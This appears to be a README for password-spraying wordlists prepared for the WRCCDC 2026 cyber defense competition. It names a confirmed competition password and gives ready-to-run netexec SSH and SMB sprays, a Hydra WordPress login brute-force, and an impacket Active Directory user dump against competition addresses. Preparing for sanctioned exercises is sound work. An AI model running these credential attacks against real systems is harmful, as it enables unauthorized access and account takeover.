# Wordlists — WRCCDC Regionals 2026

Credential spray lists for competition use. Read CONFIDENCE notes before using.

## Files

### quals-2026-passwords.txt
- **Theme:** Water/Hydration (rmwpra.hydration domain)
- **Confidence:** HIGH — based on quals PCAP analysis and environment reuse assumption
- **Top entry:** `WaterIsWet??` (CONFIRMED — scoring engine verified at quals)
- **Use only if:** quals topology verification passes (see PRIVATE-PLAYBOOK.md verification gate)
- **Fallback:** Bottom section contains universal CCDC defaults that work regardless

### quals-2026-usernames.txt
- **Confidence:** UNKNOWN for specific names; HIGH for format (FIRSTNAME_LASTNAME all caps)
- **Priority use:** Get real AD user list via `impacket-GetADUsers` as soon as DC access is established, then spray that instead
- **Format:** Mix of service accounts (spray anytime) and format templates (replace with real roster)

## Usage examples

```bash
# Spray passwords against SSH hosts with known username
netexec ssh 10.100.101.2 10.100.102.2 10.100.103.2 -u root -p quals-2026-passwords.txt --no-bruteforce --continue-on-success

# Spray password list against SMB with known username
netexec smb <dc-ips> -u Administrator -p quals-2026-passwords.txt --no-bruteforce --continue-on-success

# Spray username list against known password
netexec smb <dc-ip> -u quals-2026-usernames.txt -p 'WaterIsWet??' --no-bruteforce --continue-on-success

# Hydra against WordPress
hydra -l admin -P quals-2026-passwords.txt <team-ip> http-post-form \
  "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:ERROR" \
  -t 4 -f
```

## Updating during competition

Once any DC access is established:
```bash
impacket-GetADUsers -all rmwpra.hydration/Administrator:'WaterIsWet??'@10.100.10N.14 | \
  awk '{print $1}' > /tmp/real-ad-users.txt
```
Use `/tmp/real-ad-users.txt` instead of `quals-2026-usernames.txt` for all subsequent sprays.
